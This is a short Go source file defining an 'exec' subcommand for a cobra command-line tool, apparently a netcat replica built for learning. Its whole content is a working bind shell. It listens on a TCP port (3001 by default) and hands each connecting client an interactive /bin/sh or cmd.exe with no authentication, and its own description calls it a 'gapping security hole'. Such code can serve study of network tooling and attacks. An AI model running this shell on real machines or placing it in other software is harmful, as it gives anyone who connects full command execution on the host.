package cmd

import (
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"runtime"

	"github.com/spf13/cobra"
)

// execCmd represents the exec command
var execCmd = &cobra.Command{
	Use:   "exec",
	Short: "Gapping security hole",
	Long:  `Replication of netcat arbitrary bash commands execution`,
	Run:   runComm,
}

func runExec(conn net.Conn) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe")
	} else {
		cmd = exec.Command("/bin/sh", "-i")
	}

	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

func runComm(cmd *cobra.Command, args []string) {
	l, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
	if err != nil {
		log.Fatalln("Unable to bind to port", port)
		os.Exit(1)
	}
	fmt.Println("Accepting connecton on port", port)
	for {
		conn, err := l.Accept()
		if err != nil {
			log.Fatalln("Can not accept connection")
		}
		go runExec(conn)
	}
}

func init() {
	rootCmd.AddCommand(execCmd)
	execCmd.Flags().IntVarP(&port, "port", "p", 3001, "Listen on given port")
}
